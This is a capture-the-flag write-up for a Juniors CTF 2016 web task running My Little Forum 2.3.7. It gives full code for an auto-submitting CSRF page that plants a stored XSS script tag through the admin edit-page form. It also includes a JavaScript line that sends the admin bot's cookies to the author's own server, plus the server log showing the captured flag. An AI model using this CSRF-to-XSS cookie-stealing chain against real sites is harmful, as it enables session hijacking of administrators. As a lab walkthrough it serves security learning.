# Forum for all
##### Juniors CTF 2016 (http://ctf.org.ru)
```
http://10.0.38.133:61937
```

This web task was running My Little Forum 2.3.7, which has several known vulnerabilities: https://www.exploit-db.com/exploits/40676/.

Luckily, there is an admin bot that is periodically clicking posted links, so we can get the bot to a page controlled by us.

I used Python's `SimpleHTTPServer` to handle HTTP and a JavaScript injection to steal the cookies.

## csrf.html
```html
<html>
<head></head>
<body>
<form action="http://10.0.38.133:61937/index.php?mode=admin&action=edit_page" method="post" accept-charset="utf-8">
<input type="hidden" name="mode" value="admin">
<input type="hidden" name="title" value="asdf">
<input type="hidden" name="content" value="asdf">
<input type="hidden" name="menu_linkname" value="XSS<script src='http://10.3.0.162:8002/csrf.js'></script>">
<input id='trigger' type="submit" name="edit_page_submit" value="OK - Save page">
</form>
<script>document.getElementById('trigger').click();</script>
</body>
</html>
```

## csrf.js
```js
var img = document.createElement('img');
img.src = 'http://10.3.0.162:8002/'+document.cookie;
document.body.appendChild(img);
```

After setting up the files, I ran `python -m SimpleHTTPServer 8002` and posted `[link]http://10.3.0.162:8002/csrf.html[/link]` on the forum.

Soon the requests come in:
```
10.0.4.3 - - [27/Nov/2016 14:32:03] "GET /csrf.html HTTP/1.1" 200 -
10.0.4.3 - - [27/Nov/2016 14:35:04] "GET /csrf.js HTTP/1.1" 200 -
10.0.4.3 - - [27/Nov/2016 14:35:04] "GET /flag=adminn_superforum31221 HTTP/1.1" 404 -
```
